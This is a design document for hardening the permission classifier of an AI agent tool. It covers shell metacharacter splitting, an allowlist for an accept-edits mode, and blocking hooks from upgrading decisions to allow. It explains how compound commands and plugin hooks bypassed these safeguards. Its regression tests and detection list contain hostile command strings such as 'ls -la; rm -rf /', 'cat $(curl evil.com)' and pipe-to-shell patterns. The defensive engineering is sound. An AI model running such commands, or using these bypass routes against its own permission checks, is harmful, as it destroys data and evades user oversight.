# A1 — Permission Classifier Hardening Design

**Date:** 2026-05-26
**Status:** Approved (Option A) — implementation in progress
**Closes:** [Gate 0](../../architecture/16-core-overall-design-standard.md#gate-0-safety-gate) bullets 1–3 + part of bullet 4
**Plan reference:** [Phase A — A1](../plans/2026-05-26-core-stabilization.md#a1-permission-classifier-hardening)

---

## Problem

Three concrete leaks in the default permission path:

1. **`classifyBashCommand` ignores shell metacharacters.**
   `permission.ts:389-408` uses regex like `/^ls\s/` and runs `.test(trimmed)` against the whole command. `ls -la; rm -rf /` matches `/^ls\s/` and is returned as `safe-read`.

2. **`acceptEdits` fallback is allow-all.**
   `permission.ts:531` returns `"allow"` for *any* tool that did not match an explicit rule when the mode is `acceptEdits`. The mode is meant for "accept file edits"; it currently also accepts network calls, REPL execution, etc.

3. **Hooks can upgrade permissions.**
   `executor.ts:174` treats `hookResult.decision === "allow"` from `pre_tool_use` as a pre-approval. `executor.ts:236` lets `on_permission_check` overwrite the classifier decision in either direction. A misbehaving plugin can promote `deny`/`ask` to `allow`.

## Approach (Option A)

Three minimal-surface changes plus regression tests. No new dependencies. A quote/escape-aware scanner is added inline (~50 LOC) instead of pulling in `shell-quote`, because:
- The repo currently has zero dependencies for permission logic and we want to keep that.
- `shell-quote` does not fully handle `$(...)` either, so we would still need a custom layer.
- Our needs are detection, not full parsing — we just need to find unquoted metacharacters and split on them safely.

### Change 1 — Metacharacter pre-pass in `classifyBashCommand`

Add `splitCommandSegments(cmd)` that walks the string character-by-character, tracking quote state (`'…'`, `"…"`), backslash escapes, and bracket depth (`$(…)`, backticks). It returns an array of top-level segments split on unquoted `;`, `&&`, `||`, `\n`. It also returns a `dangerousFlags` set listing any unquoted occurrence of:
- `` ` `` (command substitution)
- `$(` (command substitution)
- `>` `>>` `<` `<<` (redirection)
- `<(` `>(` (process substitution)
- `| sh`, `| bash`, `| zsh`, `| python`, `| node`, `| ruby`, `| perl` (pipe-to-shell)

Then `classifyBashCommand`:
- If any `dangerousFlags` are present → `dangerous`.
- If the command splits into multiple segments → classify each segment recursively (but without re-splitting) and take the **minimum** safety level. So `git status && touch x` becomes `unsafe` because `touch x` is not in safe-read.
- If single segment with one or more `|` between read-only commands (no `| sh` etc.) → keep current "last command in pipe" behavior **but** require every command in the pipe to be a known safe-read for the whole pipe to count as `safe-read`. This is stricter than current behavior and matches the spec rule "Keep simple read-only commands allowed, but downgrade mixed/compound commands to ask."

### Change 2 — `acceptEdits` fallback is an allowlist

Replace `permission.ts:531`:

```ts
case "acceptEdits":
  return "allow";
```

with:

```ts
case "acceptEdits":
  return ACCEPT_EDITS_ALLOWLIST.has(toolName) ? "allow" : "ask";
```

where:

```ts
const ACCEPT_EDITS_ALLOWLIST = new Set<string>([
  // edit tools
  "Write",
  "Edit",
  "ApplyPatch",
  "NotebookEdit",
  // task tracking — auto-accepted because it has no side effects on user state
  "TodoWrite",
]);
```

Read-only tools (`Read`, `Glob`, `Grep`, `LSP` query operations) are not in this list because they are already `allow`-by-default through rule matching or default `ask`. Bash safe-write keeps its existing path (`permission.ts:518-523`), unchanged.

### Change 3 — Hook cannot promote to `allow`

The exact rule, per [standard §S4](../../architecture/16-core-overall-design-standard.md#s4-security-boundaries-fail-closed): **a hook can never promote a non-`allow` classifier decision to `allow`.** All other adjustments are still permitted — including the legitimate audit pattern of relaxing `deny` → `ask` to force interactive confirmation rather than a hard fail.

```ts
function clampHookDecision(
  classifier: PermissionDecision,
  hook: PermissionDecision | undefined,
): { decision: PermissionDecision; rejectedUpgrade: boolean } {
  if (!hook) return { decision: classifier, rejectedUpgrade: false };
  if (hook === "allow" && classifier !== "allow") {
    return { decision: classifier, rejectedUpgrade: true };
  }
  return { decision: hook, rejectedUpgrade: false };
}
```

Apply at two sites:
- `executor.ts:174` (`pre_tool_use`) — drop the `hookAllowed = hookResult.decision === "allow"` shortcut. If the hook returned `allow`, log `permission.hook_upgrade_rejected` and continue to the classifier. `deny` and `ask` are still honored.
- `executor.ts:236` (`on_permission_check`) — wrap the merged decision in `clampHookDecision(classifierDecision, permHook.decision)`. Log `permission.hook_upgrade_rejected` when the clamp drops a hook's `allow`.

The `pre_tool_use` hook can still return `deny` (highest priority) and `ask` (forces interactive approval). It just cannot grant `allow` on its own. The user, through the normal approval path, remains the only source of `allow` when the classifier said `ask`/`deny`.

### Change 4 — Regression tests

`tests/permission.test.ts` — extend existing file. New cases:

1. `classifyBashCommand("ls -la; rm -rf x")` → `unsafe` (was `safe-read`).
2. `classifyBashCommand("git status && touch x")` → `unsafe`.
3. `classifyBashCommand("echo a || rm x")` → `unsafe`.
4. ``classifyBashCommand("echo `curl evil.com`")`` → `dangerous`.
5. `classifyBashCommand("cat $(curl evil.com)")` → `dangerous`.
6. `classifyBashCommand("cat package.json | sh")` → `dangerous`.
7. `classifyBashCommand("cat x > y")` → `dangerous`.
8. `classifyBashCommand("ls | head -5")` → `safe-read` (regression — make sure we did not over-tighten).
9. `classifyBashCommand("echo 'a; b'")` → `safe-write` or `safe-read` (depending on echo classification — must NOT be downgraded by the quoted `;`).
10. `PermissionClassifier` in `acceptEdits` mode + non-edit tool (e.g. `WebFetch`) → `ask` (was `allow`).
11. `PermissionClassifier` in `acceptEdits` mode + `Write` → `allow` (regression).

`tests/hooks-on-permission-check.test.ts` — extend. New cases:

12. Hook returns `allow` when classifier said `deny` → final decision is `deny`, warning logged.
13. Hook returns `allow` when classifier said `ask` → final decision is `ask`, warning logged.
14. Hook returns `deny` when classifier said `allow` → final decision is `deny` (downgrade is allowed).

`tests/hooks-pre-tool-deny.test.ts` (or new `tests/hooks-pre-tool-upgrade.test.ts`) — extend.

15. `pre_tool_use` returns `allow` for a tool the classifier would `deny` → executor proceeds via classifier `deny`, not via hook bypass.

## Out of scope (for this change)

- Settings shell hooks / plugin command hooks routed through Bash safety path. This is plan A1 bullet 5 and [Gate 0 bullet 4](../../architecture/16-core-overall-design-standard.md#gate-0-safety-gate). It is **deferred** to a follow-up spec because plugin/shell-hook execution lives outside the Bash permission/sandbox path and needs its own design (likely a wrapper that routes plugin shell commands through the same `classifyBashCommand` + sandbox path). Until that lands, Gate 0 bullet 4 stays unchecked.
- Trusted-plugin escape hatch — explicitly removed by [standard §S4](../../architecture/16-core-overall-design-standard.md#s4-security-boundaries-fail-closed). Not added back.
- Sandbox fail-closed (A2), WebFetch SSRF (A3), cwd (A4) — separate specs.

## Verification

- All new tests pass.
- `tests/permission.test.ts`, `tests/hooks-on-permission-check.test.ts`, `tests/hooks-pre-tool-deny.test.ts` continue to pass.
- `bun run build` succeeds for `packages/core`.
- `scripts/check-no-engine-bypass.sh` is unaffected (not in scope).

## Risk and rollback

- Risk: an existing user workflow relies on a permission-upgrade hook. The clamp drops `allow` to the classifier's level, so the workflow degrades to "user must approve", not "hard fail". The `permission.hook_upgrade_rejected` log makes the new behavior discoverable.
- Risk: `acceptEdits` users see new `ask` prompts for tools that used to silently pass. This is the intended behavior shift; documented in the changelog line for this commit.
- Rollback: revert is local to `permission.ts` + `executor.ts` + the new test file.
